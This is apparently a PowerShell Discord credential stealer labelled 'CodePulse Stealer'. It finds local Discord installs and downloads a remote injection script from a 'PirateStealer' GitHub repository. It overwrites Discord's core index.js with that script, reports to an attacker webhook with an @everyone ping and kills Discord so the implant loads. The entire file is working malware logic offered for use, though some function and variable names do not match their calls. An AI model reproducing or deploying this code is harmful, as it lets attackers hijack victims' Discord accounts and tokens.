$webhookUrl = "YOUR HOOOK HERE HAHAH"
$local_app_data = $env:localappdata

function Invoke-DiscordInjection {
    foreach ($directory in Get-ChildItem $local_app_data) {
        if ($directory.Name.ToLower().Contains("discord")) {
            foreach ($subdirectory in Get-ChildItem (Join-Path $local_app_data $directory) -Directory) {
                if ($subdirectory.Name -match "app-(\d*\.\d*)*") {
                    $directory_path = Join-Path (Join-Path $local_app_data $directory) $subdirectory
                    $injection_script = (Invoke-WebRequest "https://raw.githubusercontent.com/6R-r/PirateStealer/main/src/injection/injection-clean.js").Content.Replace("%WEBHOOK%", $webhook_url) # invoke webrequest = axios or requests basically a request yk
                    
                    try {
                        $index_file_path = Join-Path (Join-Path (Join-Path $directory_path "modules") "discord_desktop_core-1") "discord_desktop_core"
                        $index_file_path = Join-Path $index_file_path "index.js"
                        Set-Content -Path $index_file_path -Value $injection_script -Encoding utf8
                        Write-Host "Wait..."
                        return $true
                    }
                    catch {
                    }
                }
            }
        }
    }
    
    return $false
}

function Invoke-Kill-Discord {
    $discordProcesses = Get-Process | Where-Object { $_.Name -eq "Discord" }
    foreach ($process in $discordProcesses) {
        $process.Kill()
    }
}

$embed = @{
    "title" = "Discord Injection - CodePulse Stealer"
    "color" = 3447704
    "fields" = @()
}

$injection_successful = Inject-Discord

if ($injection_successful) {
    $embed.fields += @{
        "name" = "Injection Status"
        "value" = "Discord injection completed successfully."
        "inline" = $false
    }
}
else {
    $embed.fields += @{
        "name" = "Injection Status"
        "value" = "Discord injection failed."
        "inline" = $false
    }
}

$content = "@everyone"

$payload = @{
    "embeds" = @($embed)
    "content" = $content
} | ConvertTo-Json -Depth 5

Invoke-RestMethod -Method Post -Uri $webhookUrl -ContentType "application/json" -Body $payload


Kill-Discord
